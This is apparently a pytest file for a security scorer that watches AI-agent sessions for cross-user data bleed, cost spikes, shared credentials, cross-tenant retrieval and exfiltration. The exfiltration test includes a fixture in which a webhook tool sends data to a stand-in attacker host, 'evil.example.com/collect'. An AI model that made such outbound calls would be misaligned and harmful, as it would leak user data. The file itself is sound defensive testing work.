"""Unit tests for cross-session signal functions — no real infra required."""
import pytest
from unittest.mock import AsyncMock, patch, MagicMock

from tests.conftest import SESSION_ID, TENANT_ID, AGENT_ID, EVENT_ID
from consumers.security_eval.scorer import cross_session as cs

SESSION = {
    "initial_input": "show me the reports",
    "duration_ms": 500,
    "graph_state": "{}",
}


def _event(event_type: str, tool_name: str | None = None, **kwargs) -> dict:
    return {
        "event_type": event_type,
        "event_id": EVENT_ID,
        "session_id": SESSION_ID,
        "tool_name": tool_name,
        "llm_input_tokens": kwargs.get("input_tokens", 0),
        "llm_output_tokens": kwargs.get("output_tokens", 0),
        "payload": kwargs.get("payload", {}),
    }


# ─────────────────────────────────────────────────────────────────────────────
# SID-03a — Cross-user context bleed
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_sid03a_fires_when_pii_and_other_users_exist():
    events = [
        _event("llm_end", payload={
            "completion": "user@example.com has an account",
            "user_context_id": "user-abc",
        })
    ]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(
        return_value=[{"session_id": "other-session", "user_context_id": "user-xyz"}]
    )):
        result = await cs.check_cross_user_bleed(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is not None
    assert result.sub_check_id == "SID-03a"
    assert result.owasp_signal_id == "OW-LLM02"
    assert result.check_score == 95


@pytest.mark.asyncio
async def test_sid03a_silent_no_pii():
    events = [_event("llm_end", payload={"completion": "Here are the reports."})]
    result = await cs.check_cross_user_bleed(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


@pytest.mark.asyncio
async def test_sid03a_silent_no_other_users():
    events = [
        _event("llm_end", payload={
            "completion": "user@example.com",
            "user_context_id": "user-abc",
        })
    ]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(return_value=[])):
        result = await cs.check_cross_user_bleed(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


@pytest.mark.asyncio
async def test_sid03a_silent_no_user_context():
    events = [_event("llm_end", payload={"completion": "user@example.com"})]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(
        return_value=[{"session_id": "s", "user_context_id": "other"}]
    )):
        result = await cs.check_cross_user_bleed(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# UBC-03a — Request rate spike
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_ubc03a_fires_on_high_session_rate():
    events = [_event("llm_start", payload={"user_context_id": "user-abc"})]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(side_effect=[
        [{"session_count": 100}],   # current 1hr count
        [{"avg_sessions": 2.0}],    # baseline
    ])):
        result = await cs.check_request_rate_spike(
            events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID, user_context_id="user-abc"
        )
    assert result is not None
    assert result.sub_check_id == "UBC-03a"
    assert result.owasp_signal_id == "OW-LLM10"


@pytest.mark.asyncio
async def test_ubc03a_silent_within_baseline():
    events = []
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(side_effect=[
        [{"session_count": 3}],    # current
        [{"avg_sessions": 5.0}],   # baseline — 3 < 5*5=25 threshold
    ])):
        result = await cs.check_request_rate_spike(
            events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID, user_context_id="user-abc"
        )
    assert result is None


@pytest.mark.asyncio
async def test_ubc03a_silent_without_user_context():
    result = await cs.check_request_rate_spike(
        [], SESSION, TENANT_ID, SESSION_ID, AGENT_ID, user_context_id=None
    )
    assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# UBC-05a — Cost spike (Denial of Wallet)
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_ubc05a_fires_on_3x_cost_spike():
    events = [_event("llm_end", input_tokens=1000, output_tokens=1000)]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(side_effect=[
        [{"avg_daily_cost": 0.01}],   # baseline avg $0.01/day
        [{"today_cost": 0.05}],        # today $0.05 > 3x
    ])):
        with patch("core.config.settings") as mock_settings:
            mock_settings.llm_input_cost_per_1k = 0.01
            mock_settings.llm_output_cost_per_1k = 0.03
            result = await cs.check_cost_spike(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is not None
    assert result.sub_check_id == "UBC-05a"
    assert result.owasp_signal_id == "OW-LLM10"


@pytest.mark.asyncio
async def test_ubc05a_silent_below_threshold():
    events = []
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(side_effect=[
        [{"avg_daily_cost": 0.10}],  # baseline
        [{"today_cost": 0.20}],       # 2x, not 3x
    ])):
        with patch("core.config.settings") as mock_settings:
            mock_settings.llm_input_cost_per_1k = 0.01
            mock_settings.llm_output_cost_per_1k = 0.03
            result = await cs.check_cost_spike(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# IPA-05a — Identity sharing across users
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_ipa05a_fires_on_shared_credential():
    events = [
        _event("tool_start", payload={
            "tool_input": {"api_key": "secret123"},
        })
    ]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(
        return_value=[{"distinct_users": 3}]
    )):
        result = await cs.check_identity_sharing(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is not None
    assert result.sub_check_id == "IPA-05a"
    assert result.owasp_signal_id == "OW-ASI03"


@pytest.mark.asyncio
async def test_ipa05a_silent_single_user():
    events = [
        _event("tool_start", payload={
            "tool_input": {"token": "mytoken=abc123"},
        })
    ]
    with patch("core.infra.clickhouse.fetch", new=AsyncMock(
        return_value=[{"distinct_users": 1}]
    )):
        result = await cs.check_identity_sharing(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


@pytest.mark.asyncio
async def test_ipa05a_silent_no_credentials():
    events = [_event("tool_start", payload={"tool_input": {"query": "list users"}})]
    result = await cs.check_identity_sharing(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# MCP-04a — Cross-tenant retrieval anomaly
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mcp04a_fires_on_cross_tenant_uuid():
    other_tenant_uuid = "ffffffff-ffff-ffff-ffff-ffffffffffff"
    events = [
        _event("tool_end", tool_name="rag_retrieve", payload={
            "tool_output": f"result contains tenant {other_tenant_uuid}"
        })
    ]
    result = await cs.check_cross_tenant_retrieval(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is not None
    assert result.sub_check_id == "MCP-04a"
    assert result.check_score == 95


@pytest.mark.asyncio
async def test_mcp04a_silent_with_own_tenant_uuid():
    # UUID matches TENANT_ID = "00000000-0000-0000-0000-000000000002"
    events = [
        _event("tool_end", tool_name="vector_search", payload={
            "tool_output": f"result for tenant {TENANT_ID}"
        })
    ]
    result = await cs.check_cross_tenant_retrieval(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


@pytest.mark.asyncio
async def test_mcp04a_silent_non_retrieval_tool():
    events = [
        _event("tool_end", tool_name="send_email", payload={
            "tool_output": "ffffffff-ffff-ffff-ffff-ffffffffffff"
        })
    ]
    result = await cs.check_cross_tenant_retrieval(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# MCP-02a — Cross-session escalation pattern
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mcp02a_silent_when_no_successful_tools():
    events = []
    mock_pool = AsyncMock()
    mock_pool.fetch = AsyncMock(return_value=[])
    with patch("core.infra.postgres.get_pool", new=AsyncMock(return_value=mock_pool)):
        result = await cs.check_cross_session_escalation(
            events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID
        )
    assert result is None


@pytest.mark.asyncio
async def test_mcp02a_fires_on_previously_blocked_tool():
    events = [_event("tool_end", tool_name="admin_delete")]
    mock_pool = AsyncMock()
    mock_pool.fetch = AsyncMock(return_value=[
        {"sub_check_id": "IPA-01a", "detail": "admin_delete tool blocked - permission denied"}
    ])
    with patch("core.infra.postgres.get_pool", new=AsyncMock(return_value=mock_pool)):
        result = await cs.check_cross_session_escalation(
            events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID
        )
    assert result is not None
    assert result.sub_check_id == "MCP-02a"


# ─────────────────────────────────────────────────────────────────────────────
# RA-02a — Persistent exfiltration
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_ra02a_fires_on_repeated_endpoint():
    events = [
        _event("tool_start", tool_name="webhook", payload={
            "tool_input": {"url": "https://evil.example.com/collect"}
        })
    ]
    mock_pool = AsyncMock()
    mock_pool.fetch = AsyncMock(return_value=[
        {"detail": "Persistent outbound data flow to 'https://evil.example.com/collect'", "session_count": 2}
    ])
    with patch("core.infra.postgres.get_pool", new=AsyncMock(return_value=mock_pool)):
        result = await cs.check_persistent_exfil(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is not None
    assert result.sub_check_id == "RA-02a"
    assert result.owasp_signal_id == "OW-ASI10"


@pytest.mark.asyncio
async def test_ra02a_silent_no_outbound_tools():
    events = [_event("tool_start", tool_name="list_users")]
    result = await cs.check_persistent_exfil(events, SESSION, TENANT_ID, SESSION_ID, AGENT_ID)
    assert result is None
